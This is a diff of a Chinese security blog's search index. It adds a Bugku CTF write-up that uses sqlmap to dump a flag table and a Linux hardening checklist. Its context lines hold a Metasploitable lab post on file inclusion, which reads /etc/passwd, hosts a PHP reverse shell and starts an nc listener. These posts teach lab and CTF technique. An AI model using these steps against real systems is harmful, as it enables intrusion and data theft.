@@ -1,6 +1,28 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[Bugku-web题，ctf模拟题sql注入神奇的登陆框]]></title>
+    <url>%2F2019%2F05%2F17%2FBugku-web%E9%A2%98%EF%BC%8Cctf%E6%A8%A1%E6%8B%9F%E9%A2%98sql%E6%B3%A8%E5%85%A5%E7%A5%9E%E5%A5%87%E7%9A%84%E7%99%BB%E9%99%86%E6%A1%86%2F</url>
+    <content type="text"><![CDATA[这是Bugku-web题，地址为http://123.206.87.240:9001/sql/登陆网站，打开burp进行截断，账号密码随便打，burp截取后进行保存。使用sqlmap自动注入，可以发现数据库版本，数据库名使用sqlmap自动注入，发现表名flag1使用sqlmap自动注入，查看表flag1中列flag1的值使用sqlmap自动注入，可以列flag1的值]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>web破解</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[linux系统安全配置]]></title>
+    <url>%2F2019%2F05%2F17%2Flinux%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE%2F</url>
+    <content type="text"><![CDATA[用户管理1.删除系统特殊的用户账号和组账号查看系统所有用户名cat /etc/passwd删除用户jaie命令userdel jaie 2.用户密码设置编辑login.defs文件vim /etc/login.defs 3.修改自动注销账户的时间编辑profilevim /etc/profile修改“HISTSIZE”参数的值，即注销等待时间 4.给系统用户名密码存放文件加锁，防止非授权用户获得权限用chattr命令防止系统中某个关键文件被修改:chattr +i /etc/passwd 系统管理配置1.关闭系统不必要的服务cd /etc/init.d/目录下，使用mv命令把init.d下改为*.old类的文件名，目的是让系统启动时找不到这个服务的文件 2.修改init.d目录执行权限，防止修改 3.给系统服务端口列表文件加锁防止未经许可的删除或添加服务 4.修改ssh服务端口vi /etc/ssh/ssh_config把port前的#去掉，并修改端口号，保存退出。重启shh服务 5.修改部分系统文件的SUID和SGID的权限权限为SUID和SGID的执行文件，在程序运行过程中，会给进程所有者权限，如果被黑客利用就会给系统造成危害。修改chage文件的权限 6.日志管理使用dmesg查看系统引导日志cd /var/log/在log中可以看到一些的日志文件，修改这些日志的权限可以防止不相干的人修改。 lastlog记录用户最后一次成功登录时间 loginlog不良的登录尝试记录 messages 记录输出系统主控台以及由syslog系统服务程序产生的消息 utmp记录当前当前登录得每个用户 utmp扩展得utmp wtmp 记录每一次用户登陆和注销的历史消息 wtmpx 扩展的wtmp vold.log记录使用外部介质出现的错误 xferkig记录ftp的存取情况 sulog记录su命令的使用情况 acct记录每个用户使用过的命令 aculog拔出移动呼叫记录 XFree86.0.log记录Xfree86 Xwindows服务器最后一次执行的结果文件数字带有.1,.2,.3…文件为轮询日志文件。数字越大，日志越老]]></content>
+      <categories>
+        <category>linux</category>
+      </categories>
+      <tags>
+        <tag>linux</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[文件遍历漏洞]]></title>
     <url>%2F2019%2F04%2F25%2F%E6%96%87%E4%BB%B6%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E%2F</url>
     <content type="text"><![CDATA[环境搭建测试机ip：192.168.86.135靶机metasploittable的ip:192.168.86.128靶机编辑php.ini文件 sudo vim /etc/php5/cgi/php.ini //编辑php配置文件 找到allow_url_include这一行把Off改成On， sudo /etc/init.d/apache2 restart //重启apache服务 发起攻击 尝试文件/etc/passwd遍历查看，成功。 尝试定位url链接，成功 测试机开启apache服务，制作php反弹shell，使其定位其链接http://192.168.86.135/1.php`cp /url/share/webshells/php/php-reverse-shell.php /var/www/html/1.php //复制成1.php到web目录下vim 1.php //修改127.0.0.1成测试机ip完成保存service apache2 start //开启apache服务nc -nvvlp 1234 //nc开启监控端口 `]]></content>
